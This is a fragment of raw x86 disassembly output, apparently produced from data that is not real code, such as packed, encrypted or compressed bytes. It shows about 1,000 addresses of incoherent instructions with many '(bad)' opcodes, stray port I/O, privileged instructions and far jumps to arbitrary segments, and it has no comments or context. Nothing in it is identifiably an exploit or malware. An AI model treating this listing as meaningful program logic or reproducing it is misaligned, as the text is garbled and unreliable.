  4117bd:	adc    al,0x68
  4117bf:	jmp    0xab4f:0x40609974
  4117c6:	in     al,dx
  4117c7:	add    BYTE PTR [edi],dh
  4117c9:	mov    eax,0xdbae8194
  4117ce:	xchg   esi,eax
  4117cf:	aaa    
  4117d0:	(bad)  
  4117d1:	dec    edx
  4117d2:	cdq    
  4117d3:	mov    edx,0x94e0c83b
  4117d8:	(bad)  
  4117d9:	fidivr WORD PTR [ecx+0x14]
  4117dc:	ja     0x4117c8
  4117de:	call   0x6de2:0x699e08d8
  4117e5:	cwde   
  4117e6:	loop   0x411814
  4117e8:	xchg   edi,eax
  4117e9:	stc    
  4117ea:	jge    0x41183a
  4117ec:	rol    DWORD PTR [edx],0xfc
  4117ef:	pop    eax
  4117f0:	iret   
  4117f1:	ds stos DWORD PTR es:[edi],eax
  4117f3:	or     edi,ecx
  4117f5:	sbb    ch,BYTE PTR [esi-0x2b]
  4117f8:	fwait
  4117f9:	mov    al,0x99
  4117fb:	and    eax,eax
  4117fd:	mov    dl,0x88
  4117ff:	pop    esp
  411800:	and    ebp,DWORD PTR [ebp+0x8950e56]
  411806:	cmp    eax,0x17309098
  41180b:	cmp    ebx,ebp
  41180d:	jmp    0x2c498fd8
  411812:	(bad)  
  411813:	enter  0x4e5b,0xd0
  411817:	loope  0x411808
  411819:	sub    DWORD PTR [esi-0x19],esp
  41181c:	repnz data16 mov dh,0x5e
  411820:	mov    bh,0xfb
  411822:	scas   al,BYTE PTR es:[edi]
  411823:	pop    esp
  411824:	xchg   edi,eax
  411825:	call   0x8e0ff4b1
  41182a:	xchg   ebp,eax
  41182b:	xchg   edi,eax
  41182c:	add    dh,BYTE PTR [ebp-0xa]
  41182f:	call   0x50809c01
  411834:	mov    eax,0xf21246bc
  411839:	mov    bl,0x43
  41183b:	scas   eax,DWORD PTR es:[edi]
  41183c:	pop    ecx
  41183d:	sbb    al,0x8
  41183f:	mov    WORD PTR [edx],?
  411841:	fnstsw WORD PTR [esp+ecx*8]
  411844:	retf   0xc7a2
  411847:	(bad)  
  411848:	cmp    ebp,ebp
  41184a:	fistp  DWORD PTR [edx+0x10a7427c]
  411850:	xor    dl,BYTE PTR [esi+0x2242796f]
  411856:	or     eax,DWORD PTR [ebp+ecx*2+0x3f]
  41185a:	ds sbb al,bh
  41185d:	add    al,0xd3
  41185f:	cmp    BYTE PTR ds:0x26a4ef7c,0xc8
  411866:	add    eax,0xc390072b
  41186b:	inc    ecx
  41186c:	pop    ebp
  41186d:	pop    ss
  41186e:	dec    edx
  41186f:	ror    DWORD PTR [edi+edx*2-0x51404512],1
  411876:	push   edi
  411877:	xor    DWORD PTR [edi+esi*1],0x46958fd3
  41187e:	or     al,0x54
  411880:	push   ss
  411881:	mov    ebp,0xbfd01b8e
  411886:	aaa    
  411887:	pop    ss
  411888:	jb     0x411843
  41188a:	xor    dl,bh
  41188c:	ins    BYTE PTR es:[edi],dx
  41188d:	inc    DWORD PTR [edi]
  41188f:	jno    0x41189d
  411891:	lods   al,BYTE PTR ds:[esi]
  411892:	jecxz  0x411867
  411894:	push   esi
  411895:	or     al,0xf4
  411897:	bound  esi,QWORD PTR [ecx-0x4702b99a]
  41189d:	jbe    0x41183b
  41189f:	push   0x80a071c1
  4118a4:	ds inc edx
  4118a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118a7:	and    ebp,DWORD PTR [edi-0x6d64477]
  4118ad:	sahf   
  4118ae:	addr16 cs (bad) 
  4118b1:	call   0x5a8980d0
  4118b6:	dec    eax
  4118b7:	pop    eax
  4118b8:	jp     0x4118c0
  4118ba:	imul   ebp,ebx,0x1d
  4118bd:	push   esp
  4118be:	mov    ecx,0x25e1515b
  4118c3:	xchg   eax,eax
  4118c5:	xor    dh,BYTE PTR [edi]
  4118c7:	(bad)  
  4118c9:	or     al,0xb5
  4118cb:	rol    DWORD PTR [ebx+0x41d6f16d],0xbd
  4118d2:	or     eax,0x52a5c455
  4118d7:	(bad)  
  4118d8:	mov    ?,WORD PTR [edi+0x16030852]
  4118de:	xor    bl,ch
  4118e0:	xor    BYTE PTR [ecx+0x7bea6280],dl
  4118e6:	xchg   edx,eax
  4118e7:	jne    0x4118f4
  4118e9:	(bad)  
  4118ea:	xor    BYTE PTR [esi],dh
  4118ec:	lock xrelease not BYTE PTR [ecx+0xb]
  4118f1:	data16 mov ch,0xe8
  4118f4:	retf   0x173f
  4118f7:	clc    
  4118f8:	push   esi
  4118f9:	mov    ch,0x96
  4118fb:	or     BYTE PTR [edx-0x64],ah
  4118fe:	mov    esi,0xa8b5c99d
  411903:	or     BYTE PTR [ebx-0x33],cl
  411906:	loop   0x411910
  411908:	and    BYTE PTR [eax-0x256d6c84],0xea
  41190f:	fisub  WORD PTR [eax+0x36]
  411912:	jg     0x411904
  411914:	sbb    eax,0x8fba8c8b
  411919:	add    al,0x28
  41191b:	xlat   BYTE PTR ds:[ebx]
  41191c:	nop
  41191d:	pop    edx
  41191f:	ss and eax,0x9a166bad
  411925:	sbb    al,0xcc
  411927:	imul   ebp
  411929:	push   0x59
  41192b:	(bad)  [ebx+ecx*8-0x48]
  41192f:	add    cl,al
  411931:	stos   DWORD PTR es:[edi],eax
  411932:	jno    0x4118e4
  411934:	sbb    al,ah
  411936:	aam    0x35
  411938:	call   0x682793a8
  41193d:	sbb    eax,0x74ff9016
  411942:	scas   eax,DWORD PTR es:[edi]
  411943:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411944:	fwait
  411945:	les    ebp,FWORD PTR [esp+edi*8+0x2b86bbb3]
  41194c:	mov    ds:0xbeed1441,eax
  411951:	ins    BYTE PTR es:[edi],dx
  411952:	push   edx
  411953:	inc    ecx
  411954:	test   eax,0xe26ba2e2
  411959:	dec    ebp
  41195a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41195b:	sub    DWORD PTR [edi+0x13],edx
  41195e:	in     eax,dx
  41195f:	loope  0x4119b3
  411961:	retf   
  411962:	repz jl 0x411966
  411965:	adc    DWORD PTR [ebx+0x2e3809c6],ebx
  41196b:	push   cs
  41196c:	cli    
  41196d:	xor    DWORD PTR [ebp+0x78],eax
  411970:	jnp    0x41199f
  411972:	nop
  411973:	pusha  
  411974:	inc    eax
  411975:	retf   
  411976:	push   0x3d
  411978:	bound  ebp,QWORD PTR [ecx]
  41197a:	pop    ebx
  41197b:	imul   edx,ecx,0xd609e0eb
  411981:	out    0xb8,al
  411983:	mov    bh,0x77
  411985:	and    edi,esp
  411987:	(bad)  
  411989:	cmp    edi,edi
  41198b:	hlt    
  41198c:	aas    
  41198d:	outs   dx,BYTE PTR ds:[esi]
  41198e:	mov    edx,0x1d56c388
  411993:	pop    ss
  411994:	ret    0x663e
  411997:	rcr    DWORD PTR [eax-0x77],0xe7
  41199b:	cli    
  41199c:	rol    edx,0x67
  41199f:	add    esi,ecx
  4119a1:	add    BYTE PTR [ebp+0x10],al
  4119a4:	mov    ecx,?
  4119a6:	sbb    dl,al
  4119a8:	stos   BYTE PTR es:[edi],al
  4119a9:	or     DWORD PTR [edi],esp
  4119ab:	and    dh,BYTE PTR [ebx]
  4119ad:	ins    DWORD PTR es:[edi],dx
  4119ae:	or     eax,ebx
  4119b0:	dec    ecx
  4119b1:	arpl   WORD PTR [ebp+ecx*1-0x469751bd],si
  4119b8:	add    ah,dh
  4119ba:	js     0x41197f
  4119bc:	xchg   ecx,eax
  4119bd:	sti    
  4119be:	push   edi
  4119bf:	ret    
  4119c0:	push   ebx
  4119c1:	or     BYTE PTR [esp+ecx*1],0xee
  4119c5:	ret    0x25d5
  4119c8:	jmp    0x4119ef
  4119ca:	adc    BYTE PTR [edx],0x8e
  4119cd:	mov    eax,0x77174a0f
  4119d2:	ret    
  4119d3:	jno    0x4119a5
  4119d5:	mov    esi,DWORD PTR [ebp-0x53]
  4119d8:	repnz inc ch
  4119db:	jno    0x4119ba
  4119dd:	jle    0x4119df
  4119df:	loopne 0x41197b
  4119e1:	icebp  
  4119e2:	jae    0x411a3e
  4119e4:	jnp    0x411a0d
  4119e6:	imul   ecx,DWORD PTR [edi],0x8789bc3e
  4119ec:	push   0x33c3ec69
  4119f1:	stc    
  4119f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119f3:	repz test esi,esi
  4119f6:	jns    0x411980
  4119f8:	jno    0x4119d9
  4119fa:	sti    
  4119fb:	ja     0x4119f5
  4119fd:	or     dh,dl
  4119ff:	fwait
  411a00:	retf   
  411a01:	data16 and al,0xbf
  411a04:	ror    DWORD PTR [edi-0x1d35d550],cl
  411a0a:	in     al,dx
  411a0b:	push   esi
  411a0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a0d:	ds sbb eax,0x78004b26
  411a13:	or     eax,edx
  411a15:	(bad)  
  411a16:	jl     0x4119c3
  411a18:	clc    
  411a19:	outs   dx,BYTE PTR ds:[esi]
  411a1a:	imul   ebx,DWORD PTR [edx],0x730de9f2
  411a20:	and    al,0xcc
  411a22:	inc    ecx
  411a23:	imul   edi,DWORD PTR [esi+esi*2],0xffffffc7
  411a27:	popf   
  411a28:	shl    BYTE PTR [ebx+0x54],cl
  411a2b:	repnz shl DWORD PTR [ecx-0x123bec31],0x2d
  411a33:	push   esi
  411a34:	push   ebp
  411a35:	cmovs  ebx,DWORD PTR ds:0x2bf43f6c
  411a3c:	in     eax,dx
  411a3d:	ds adc eax,0xf1f897a6
  411a43:	push   ds
  411a44:	stos   BYTE PTR es:[edi],al
  411a45:	cmp    dl,BYTE PTR [edi+0x36]
  411a48:	mov    esi,DWORD PTR [eax+0x4613f753]
  411a4e:	shl    DWORD PTR [esi-0x1a],cl
  411a51:	jo     0x411a04
  411a53:	dec    edx
  411a54:	push   0xaa4e11d8
  411a59:	stos   DWORD PTR es:[edi],eax
  411a5a:	xor    dl,BYTE PTR [eax-0x2354dd58]
  411a60:	cmp    edi,eax
  411a62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a63:	sti    
  411a64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a65:	daa    
  411a66:	jnp    0x411a53
  411a68:	int3   
  411a69:	cmc    
  411a6a:	xchg   edx,eax
  411a6b:	mov    ch,0xf9
  411a6d:	mov    ah,0x6c
  411a6f:	lds    esp,FWORD PTR [edi]
  411a71:	xor    al,BYTE PTR [esi+eiz*8+0x307289]
  411a78:	punpckhdq mm4,mm6
  411a7b:	call   0x165e:0x521e682c
  411a82:	daa    
  411a83:	inc    esi
  411a84:	sbb    dh,al
  411a86:	daa    
  411a87:	or     al,0x8f
  411a89:	cmp    eax,0xde13a5a8
  411a8e:	mov    DWORD PTR [edi+0x79],ebx
  411a91:	or     BYTE PTR [edi*1+0x3b2be428],al
  411a98:	mov    al,0xa
  411a9a:	and    al,0xb9
  411a9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a9d:	mov    ebx,DWORD PTR [edx]
  411a9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411aa0:	and    BYTE PTR [edx],bh
  411aa2:	jecxz  0x411aa2
  411aa4:	lahf   
  411aa5:	inc    esp
  411aa6:	in     eax,0x9e
  411aa8:	les    eax,FWORD PTR [edi]
  411aaa:	xchg   al,bl
  411aac:	jl     0x411a5c
  411aae:	cmp    DWORD PTR [ebx-0x3a],ecx
  411ab1:	push   edi
  411ab2:	or     DWORD PTR [ecx],esi
  411ab4:	lahf   
  411ab5:	or     al,0xe6
  411ab7:	jp     0x411a73
  411ab9:	xchg   ecx,eax
  411aba:	dec    esp
  411abb:	inc    esi
  411abc:	inc    esi
  411abd:	push   0x4d
  411abf:	cs ret 0xd73
  411ac3:	ror    DWORD PTR [edx-0x4e2cfd6a],cl
  411ac9:	and    eax,0x2bbae7d6
  411ace:	xor    eax,0x6d8c2f03
  411ad3:	xchg   edi,eax
  411ad4:	and    eax,0x10187df4
  411ad9:	popa   
  411ada:	dec    eax
  411adb:	or     BYTE PTR [edi],0x64
  411ade:	mov    eax,ds:0xe9643d2
  411ae3:	in     eax,0xd4
  411ae5:	sti    
  411ae6:	inc    edi
  411ae7:	adc    BYTE PTR [esi-0x2463a751],cl
  411aed:	into   
  411aee:	pusha  
  411aef:	sub    BYTE PTR [edi+edi*2],0x10
  411af3:	cmp    BYTE PTR [eax-0x5],bl
  411af6:	cmp    al,0xe2
  411af8:	mov    esi,0x1ddea8ae
  411afd:	ins    BYTE PTR es:[edi],dx
  411afe:	cs stos DWORD PTR es:[edi],eax
  411b00:	(bad)  
  411b01:	jl     0x411b34
  411b03:	call   0xeb4b736e
  411b08:	mov    ds:0x753a924b,al
  411b0d:	ret    
  411b0e:	ins    BYTE PTR es:[edi],dx
  411b0f:	pop    es
  411b10:	mov    WORD PTR [edx+0x5e],cs
  411b13:	sbb    DWORD PTR [edi+edx*2],ebp
  411b16:	retf   0x3ac3
  411b19:	xor    eax,esi
  411b1b:	stc    
  411b1c:	sbb    eax,0x5feb26e1
  411b21:	mov    esi,0x88350f02
  411b26:	sbb    DWORD PTR [edx],esp
  411b28:	js     0x411b71
  411b2a:	stos   DWORD PTR es:[edi],eax
  411b2b:	sbb    ch,BYTE PTR [ecx+0x6e9a98f2]
  411b31:	popa   
  411b32:	sub    BYTE PTR [esi+0x3915ee4],ah
  411b38:	fst    QWORD PTR [ecx+0x1d]
  411b3b:	and    al,0xde
  411b3d:	mov    ecx,0x175c7751
  411b42:	lods   al,BYTE PTR ds:[esi]
  411b43:	repz scas al,BYTE PTR es:[edi]
  411b45:	sbb    eax,0x758828b2
  411b4a:	call   0xc08f:0xf71837f0
  411b51:	sub    esi,ebp
  411b53:	pop    edx
  411b54:	xchg   ecx,eax
  411b55:	mov    edx,0x7dfe11ce
  411b5a:	lock dec edx
  411b5c:	add    DWORD PTR [eax-0x64],0xfffffff5
  411b60:	mov    DWORD PTR [edx+0x1],ebp
  411b63:	and    al,ah
  411b65:	lods   eax,DWORD PTR ds:[esi]
  411b66:	mov    dl,0x33
  411b68:	xor    DWORD PTR ds:0xc92a19cb,ecx
  411b6e:	cwde   
  411b6f:	jno    0x411af6
  411b71:	ja     0x411bf2
  411b73:	retf   0x1c42
  411b76:	adc    ebx,DWORD PTR [eax-0x79]
  411b79:	out    0x39,eax
  411b7b:	daa    
  411b7c:	loop   0x411b47
  411b7e:	retf   
  411b7f:	mov    bl,bl
  411b81:	scas   al,BYTE PTR es:[edi]
  411b82:	push   ebp
  411b83:	cli    
  411b84:	pop    ds
  411b85:	cmc    
  411b86:	imul   BYTE PTR [esi+0xf454ede]
  411b8c:	jno    0x411bb5
  411b8e:	push   ebx
  411b8f:	push   es
  411b90:	cs push ss
  411b92:	imul   edi,DWORD PTR [edi],0xc3d7e5ba
  411b98:	iret   
  411b99:	jmp    0xef44:0x8640d4a0
  411ba0:	call   0x6dafbc3
  411ba5:	pop    edi
  411ba6:	aas    
  411ba7:	daa    
  411ba8:	es lahf 
  411baa:	ins    DWORD PTR es:[edi],dx
  411bab:	push   edi
  411bac:	push   cs
  411bad:	je     0x411b4e
  411baf:	cmp    bh,dl
  411bb1:	(bad)  
  411bb2:	xlat   BYTE PTR ds:[ebx]
  411bb3:	ret    
  411bb4:	repz in eax,0x3a
  411bb7:	mov    bl,0x4f
  411bb9:	in     eax,0xc5
  411bbb:	test   DWORD PTR [eax+0x5b],eax
  411bbe:	stos   BYTE PTR es:[edi],al
  411bbf:	xchg   edi,eax
  411bc0:	fnsave [eax]
  411bc2:	dec    edx
  411bc3:	pop    esi
  411bc4:	pop    ebx
  411bc5:	(bad)  
  411bc6:	pop    ebp
  411bc7:	mov    ebx,0xfe1981a9
  411bcc:	cmp    bl,BYTE PTR [edi-0x8fc9771]
  411bd2:	dec    ebp
  411bd3:	std    
  411bd4:	pop    ecx
  411bd5:	cmp    BYTE PTR [edx],ah
  411bd7:	or     BYTE PTR [ebx+0x3f8d4fbe],al
  411bdd:	xor    dl,BYTE PTR [ecx+0x1ece6917]
  411be3:	repz daa 
  411be5:	adc    eax,0x7813d450
  411bea:	xchg   ebp,eax
  411beb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bec:	repz aad 0xad
  411bef:	rol    dh,1
  411bf1:	in     al,0xb1
  411bf3:	rcr    DWORD PTR [edx],1
  411bf5:	out    dx,al
  411bf6:	jp     0x411bc7
  411bf8:	adc    ch,BYTE PTR [esi+ebp*1]
  411bfb:	inc    esi
  411bfc:	and    esi,eax
  411bfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bff:	ficomp DWORD PTR [eax-0x66d29c33]
  411c05:	inc    esp
  411c06:	inc    ecx
  411c07:	cmp    eax,DWORD PTR [esi]
  411c09:	rol    DWORD PTR [ecx-0x1f07206a],0x17
  411c10:	adc    ebx,ebx
  411c12:	outs   dx,BYTE PTR ds:[esi]
  411c13:	xor    al,0x41
  411c15:	jo     0x411c34
  411c17:	cmp    BYTE PTR [ecx-0x26372ba3],cl
  411c1d:	out    0xaa,eax
  411c1f:	jmp    0x2108:0xff981987
  411c26:	xor    dh,bl
  411c28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c29:	add    dl,BYTE PTR ds:0x5d035f40
  411c2f:	repnz arpl WORD PTR [esi+0x4a167dce],si
  411c36:	out    dx,eax
  411c37:	mov    bl,0xb
  411c39:	xor    DWORD PTR [edx],edx
  411c3b:	push   ecx
  411c3c:	shl    BYTE PTR [esp+ebp*8-0x1e],cl
  411c40:	dec    esp
  411c41:	test   BYTE PTR [esi-0x67],dl
  411c44:	xor    edx,DWORD PTR [edx+0x4]
  411c47:	bnd gs jno 0x411c20
  411c4b:	push   ss
  411c4c:	div    ebx
  411c4e:	pop    edx
  411c4f:	or     esi,DWORD PTR [edi-0xa]
  411c52:	cdq    
  411c53:	or     eax,0x108473b
  411c58:	mov    bh,0xad
  411c5a:	and    esi,edi
  411c5c:	adc    cl,BYTE PTR [edi-0x719b1ffe]
  411c62:	dec    esp
  411c63:	lock inc ecx
  411c65:	xchg   ebp,eax
  411c66:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c68:	mov    ebp,ss
  411c6a:	neg    ecx
  411c6c:	adc    ah,ah
  411c6e:	pop    esi
  411c6f:	xlat   BYTE PTR ds:[ebx]
  411c70:	outs   dx,BYTE PTR ds:[esi]
  411c71:	imul   ebp,eax,0x77
  411c74:	mov    ebx,0xdd1c217c
  411c79:	jne    0x411c82
  411c7b:	jge    0x411cb1
  411c7d:	pop    ss
  411c7e:	mov    esi,0x564a38ab
  411c83:	mov    ds:0x7d978479,eax
  411c88:	call   0x1937:0xd99cb9cd
  411c8f:	push   0xffffffaa
  411c91:	xchg   edi,eax
  411c92:	pop    ebx
  411c93:	in     al,dx
  411c94:	std    
  411c95:	pop    eax
  411c96:	mov    al,ds:0x21f5fc3e
  411c9b:	into   
  411c9c:	mov    ds:0xc72b6410,eax
  411ca1:	shl    DWORD PTR [ebp-0x2b],cl
  411ca4:	xchg   esp,eax
  411ca5:	mul    BYTE PTR gs:[edx-0x7b78a6d9]
  411cac:	rol    BYTE PTR [esi-0x579b07e9],1
  411cb2:	pushf  
  411cb3:	xchg   BYTE PTR [esi-0x194d9c5f],ah
  411cb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cba:	adc    ebp,DWORD PTR [ebp-0x2c]
  411cbd:	in     al,dx
  411cbe:	repz sbb eax,0x255742b3
  411cc4:	jb     0x411cb8
  411cc6:	inc    DWORD PTR [eax+0x5c]
  411cc9:	sbb    DWORD PTR [edi+0x548d0ffb],edi
  411ccf:	sub    DWORD PTR [eax+0xe],0xffffffeb
  411cd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cd4:	daa    
  411cd5:	out    dx,eax
  411cd6:	lock push cs
  411cd8:	sar    DWORD PTR [edi+0x46caad6d],cl
  411cde:	dec    ecx
  411cdf:	mov    ah,0xc8
  411ce1:	addr16 push cs
  411ce3:	xor    al,0x87
  411ce5:	mov    eax,ds:0x9db5f381
  411cea:	or     ebx,DWORD PTR [esi+0x54]
  411ced:	cmp    al,ah
  411cef:	or     BYTE PTR [edi+esi*2-0x68],al
  411cf3:	loope  0x411d58
  411cf5:	pop    ecx
  411cf6:	jp     0x9cefd62
  411cfc:	xchg   ecx,ebx
  411cfe:	pop    esi
  411cff:	mov    esi,0x9c92767e
  411d04:	leave  
  411d05:	or     eax,0x2f8268c
  411d0a:	pop    ebx
  411d0b:	shl    DWORD PTR [eax],cl
  411d0d:	push   es
  411d0e:	pop    ebp
  411d0f:	inc    ebx
  411d10:	enter  0x3c5c,0xfe
  411d14:	xchg   ecx,eax
  411d15:	std    
  411d16:	iret   
  411d17:	xchg   esi,eax
  411d18:	call   0x15fa:0x9c9fd1fa
  411d1f:	mov    BYTE PTR [edx+0x3926119],dl
  411d25:	daa    
  411d26:	cmp    dh,0x8b
  411d29:	cmp    BYTE PTR [edx+0x779373f9],0x41
  411d30:	xlat   BYTE PTR ds:[ebx]
  411d31:	sbb    BYTE PTR [ebx-0x7482c63d],dl
  411d37:	pop    esi
  411d38:	lods   al,BYTE PTR ds:[esi]
  411d3a:	and    ecx,DWORD PTR [esi+ebx*4-0x3a]
  411d3e:	xor    bh,BYTE PTR [esi-0x36cc2429]
  411d44:	test   edx,esi
  411d46:	xchg   ebx,eax
  411d47:	dec    ecx
  411d48:	mov    ds:0x412d07dd,al
  411d4d:	stos   DWORD PTR es:[edi],eax
  411d4e:	cli    
  411d4f:	sbb    al,0x66
  411d51:	test   al,dl
  411d53:	pop    es
  411d54:	jno    0x411cde
  411d56:	jno    0x411d2b
  411d58:	and    DWORD PTR [esi+0x5c289a58],edx
  411d5e:	fidiv  WORD PTR [ebx+0x2cad4d]
  411d64:	retf   
  411d65:	loope  0x411ced
  411d67:	leave  
  411d68:	in     al,0xa1
  411d6a:	xor    al,0x4e
  411d6c:	push   ds
  411d6d:	pop    ecx
  411d6e:	pop    ds
  411d6f:	lds    eax,FWORD PTR [esi+0x12]
  411d72:	gs inc ebx
  411d74:	xor    DWORD PTR [edi],esi
  411d76:	(bad)  
  411d77:	shl    esi,0x2f
  411d7a:	les    esi,FWORD PTR [ebx-0xd56938b]
  411d80:	test   eax,0xfce00073
  411d85:	push   0x9ac3dbdd
  411d8a:	mov    WORD PTR [esi-0x311048f6],ds
  411d90:	jae    0x411d71
  411d92:	test   al,0xca
  411d94:	pop    esi
  411d95:	popf   
  411d96:	push   edi
  411d97:	xor    bl,BYTE PTR [edx]
  411d99:	lock mov ah,0x2c
  411d9c:	jnp    0x411dd7
  411d9e:	sbb    DWORD PTR [ebp-0x2229a098],edi
  411da4:	pop    edi
  411da5:	addr16 push ebx
  411da7:	adc    bl,BYTE PTR [edi+0x10ddc9a4]
  411dad:	push   ecx
  411dae:	pop    eax
  411daf:	dec    edi
  411db0:	outs   dx,BYTE PTR ds:[esi]
  411db1:	fdivr  QWORD PTR [edx]
  411db3:	xor    ch,BYTE PTR [ecx]
  411db5:	inc    ebp
  411db6:	dec    ebx
  411db7:	fistp  QWORD PTR [esi-0x54]
  411dba:	mov    eax,0x2244b02c
  411dbf:	inc    ecx
  411dc0:	(bad)  [edx-0xb172e67]
  411dc6:	cmc    
  411dc7:	cdq    
  411dc8:	or     al,0xd1
  411dca:	in     eax,0x5a
  411dcc:	(bad)  
  411dcd:	mov    eax,0xcb493d7e
  411dd2:	xabort 0x42
  411dd5:	cmp    BYTE PTR [ecx],0x43
  411dd8:	or     al,0xce
  411dda:	out    dx,al
  411ddb:	test   DWORD PTR [ebx-0x518030fc],0x4d98ad8c
  411de5:	sahf   
  411de6:	jp     0x411da5
  411de8:	fistp  WORD PTR [eax+0x25956218]
  411dee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411def:	mov    ebp,0x700d66ad
  411df4:	test   eax,0xda198ff5
  411df9:	les    ecx,FWORD PTR [ebx+0x15857df1]
  411dff:	mov    esp,DWORD PTR [eax-0x2e6dede1]
  411e05:	pand   mm1,QWORD PTR [edx]
  411e08:	jns    0x411e4d
  411e0a:	push   edx
  411e0b:	xor    DWORD PTR [edx],eax
  411e0d:	push   ds
  411e0e:	int    0x6f
  411e10:	pop    es
  411e11:	(bad)  
  411e12:	and    eax,0x5fd01e8a
  411e17:	and    al,bh
  411e19:	mov    dh,0xc4
  411e1b:	loope  0x411e69
  411e1d:	pop    edx
  411e1e:	retf   
  411e1f:	int3   
  411e20:	dec    eax
  411e21:	or     al,0x51
  411e23:	mov    ebx,0x20053a5b
  411e28:	call   0x5815:0x41aa3138
  411e2f:	cmp    al,0x3e
  411e31:	inc    edx
  411e32:	add    BYTE PTR [ebp+0x661c66fa],bl
  411e38:	xchg   ecx,eax
  411e39:	mov    ch,0xca
  411e3b:	rcl    BYTE PTR [ebp-0x77],0x4e
  411e3f:	xor    eax,0xa5af88ec
  411e44:	aas    
  411e45:	stos   DWORD PTR es:[edi],eax
  411e46:	mov    ebp,0xe49f8de3
  411e4b:	or     edx,DWORD PTR [edx-0x328ffe3c]
  411e51:	pushf  
  411e52:	cmp    eax,0xd478e3cb
  411e57:	enter  0xeb9,0x2d
  411e5b:	push   ds
  411e5c:	(bad)  
  411e5e:	jecxz  0x411ebf
  411e60:	das    
  411e61:	mov    ebp,0x3c6671d1
  411e66:	mov    ds:0xbb018736,eax
  411e6b:	cmp    BYTE PTR [edx],ah
  411e6d:	push   esp
  411e6e:	cmc    
  411e6f:	xor    dh,dl
  411e71:	xchg   ebp,ecx
  411e73:	std    
  411e74:	pop    edi
  411e75:	mov    esp,0x7c2b27a4
  411e7a:	cmc    
  411e7b:	xchg   ecx,eax
  411e7c:	pop    ss
  411e7d:	js     0x411e41
  411e7f:	daa    
  411e80:	shr    BYTE PTR [eax-0x5c],cl
  411e83:	out    dx,eax
  411e84:	pop    ds
  411e85:	shl    DWORD PTR [ebx-0x54],0xb9
  411e89:	xchg   edx,eax
  411e8a:	into   
  411e8b:	sub    DWORD PTR [ebx-0x104a541b],esi
  411e91:	daa    
  411e92:	adc    esi,edi
  411e94:	xor    bl,0x14
  411e97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e98:	imul   ebx,DWORD PTR [edx+0x7b],0x5d
  411e9c:	dec    edx
  411e9d:	sbb    al,0xf8
  411e9f:	xchg   ebx,eax
  411ea0:	mov    bl,0x21
  411ea2:	pop    ebp
  411ea3:	daa    
  411ea4:	cmp    edi,DWORD PTR [esi+0x5c]
  411ea7:	outs   dx,DWORD PTR ds:[esi]
  411ea8:	out    0x75,al
  411eaa:	test   cl,al
  411eac:	icebp  
  411ead:	mov    esi,0xdf5aeecf
  411eb2:	sbb    al,BYTE PTR [edi+esi*8]
  411eb5:	push   ebx
  411eb6:	adc    eax,0x96f02d1e
  411ebb:	dec    ebp
  411ebc:	out    0xa6,eax
  411ebe:	jp     0x411e5e
  411ec0:	add    DWORD PTR [edx+0x27],0xc9de4a07
  411ec7:	outs   dx,BYTE PTR ds:[esi]
  411ec8:	push   ebx
  411ec9:	pop    esi
  411eca:	push   0xffffffc4
  411ecc:	jmp    0x411e9a
  411ece:	jmp    0x29e7:0x9327f3fa
  411ed5:	inc    BYTE PTR [ebp+eiz*8-0x65d4e8b8]
  411edc:	xor    ch,BYTE PTR [edi]
  411ede:	xchg   BYTE PTR [eax],cl
  411ee0:	into   
  411ee1:	sbb    DWORD PTR [edx],edx
  411ee3:	sub    dh,0xef
  411ee6:	loope  0x411ee3
  411ee8:	jb     0x411e9c
  411eea:	add    al,0x9b
  411eec:	fs mov edi,0xafe18dbf
  411ef2:	jmp    0x411e80
  411ef4:	jle    0x411eb7
  411ef6:	icebp  
  411ef7:	pop    ds
  411ef8:	ret    0xcc28
  411efb:	out    dx,al
  411efc:	in     eax,0x8c
  411efe:	dec    edx
  411eff:	fiadd  DWORD PTR [ebx]
  411f01:	mov    eax,ds:0x5b04cd15
  411f06:	xor    BYTE PTR [edi-0x15bc6025],bh
  411f0c:	sar    DWORD PTR [edx-0x6da79301],0x84
  411f13:	adc    esi,esp
  411f15:	addr16 sub eax,0x724719b5
  411f1b:	rcr    BYTE PTR [esi-0x5d3cad66],1
  411f21:	in     al,dx
  411f22:	xchg   esi,eax
  411f23:	pslld  mm3,mm6
  411f26:	sbb    eax,0x1eed6d3e
  411f2b:	ror    ebp,0xbe
  411f2e:	aas    
  411f2f:	jle    0x411f68
  411f31:	mov    ds:0x56b1e938,eax
  411f36:	stos   BYTE PTR es:[edi],al
  411f37:	push   eax
  411f38:	in     al,0x43
  411f3a:	dec    esi
  411f3b:	pop    esi
  411f3c:	cmp    al,0x54
  411f3e:	lods   al,BYTE PTR ds:[esi]
  411f3f:	cmp    al,bl
  411f41:	mov    ch,0xdf
  411f43:	pushf  
  411f44:	inc    eax
  411f45:	pop    eax
  411f46:	jno    0x411f63
  411f48:	fwait
  411f49:	dec    esi
  411f4a:	neg    DWORD PTR [edx]
  411f4c:	and    ebx,esp
  411f4e:	pop    ss
  411f4f:	idiv   BYTE PTR [esp+eiz*2]
  411f52:	imul   esp,DWORD PTR [eax],0xa237bf15
  411f58:	sbb    edx,ecx
  411f5a:	cmp    al,0xa7
  411f5c:	inc    ebx
  411f5d:	je     0x411f2b
  411f5f:	mov    WORD PTR [edx-0x53],cs
  411f62:	test   DWORD PTR [esi+0x7d],edx
  411f65:	fldenv [ecx-0x1a]
  411f68:	xor    ch,dl
  411f6a:	aam    0x49
  411f6c:	cli    
  411f6d:	popf   
  411f6e:	(bad)  
  411f6f:	call   0xd3b7440c
  411f74:	mov    ebp,0x7bd56451
  411f79:	push   ecx
